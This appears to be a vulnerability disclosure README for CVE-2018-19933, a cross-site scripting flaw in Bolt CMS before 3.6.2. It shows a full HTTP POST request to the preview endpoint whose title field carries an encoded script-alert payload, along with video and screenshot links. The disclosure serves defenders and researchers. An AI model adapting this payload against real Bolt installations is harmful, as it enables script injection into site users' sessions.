# Bolt CMS <3.6.2 - Cross-Site Scripting Vulnerability
 Bolt CMS &lt;3.6.2 - Cross-Site Scripting Vulnerability

# CVE-2018-19933
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19933

# Proof of Concept
To exploit vulnerability, Bolt CMS <3.6.2 allows XSS via text input click preview button as demonstrated by the Title field of a Configured and New Entry.

 ```
 POST /preview/page HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/bolt/editcontent/pages
Content-Type: application/x-www-form-urlencoded
Content-Length: 396
Connection: close
Cookie: bolt_session_cf7976ea5999f8e272ce7cd50c84d240=14b61865131cf9422af970ae28a097b7; bolt_authtoken_cf7976ea5999f8e272ce7cd50c84d240=0b69633d5a549f19bf3faa88462b7b8e17ba57ba9dff6d25a708efe6dd6a9a04
Upgrade-Insecure-Requests: 1

content_edit%5B_token%5D=jMmm41dJQXpXx3gwE_VQkA60fdsNo6DERJClPVkYh7U&editreferrer=&contenttype=pages&title=%3Cscript%3Ealert%28%22Raif%22%29%3C%2Fscript%3E&slug=script-alert-raif-script&image%5Bfile%5D=&files%5B%5D=&teaser=&body=&template=&taxonomy%5Bgroups%5D%5B%5D=&taxonomy-order%5Bgroups%5D=0&id=&status=draft&datepublish=2018-12-07+00%3A12%3A05&datedepublish=&ownerid=1&_live-editor-preview=

 ```
 
 # Proof of Concept (Video)
 
[![PoC_Video](http://img.youtube.com/vi/3eTPyIpjCJg/0.jpg)](http://www.youtube.com/watch?v=3eTPyIpjCJg "")

# Screenshots
 
![PoC_1](https://raw.githubusercontent.com/rdincel1/Bolt-CMS-3.6.2---Cross-Site-Scripting/master/PoC_1.PNG)
![Request](https://raw.githubusercontent.com/rdincel1/Bolt-CMS-3.6.2---Cross-Site-Scripting/master/burp.PNG)
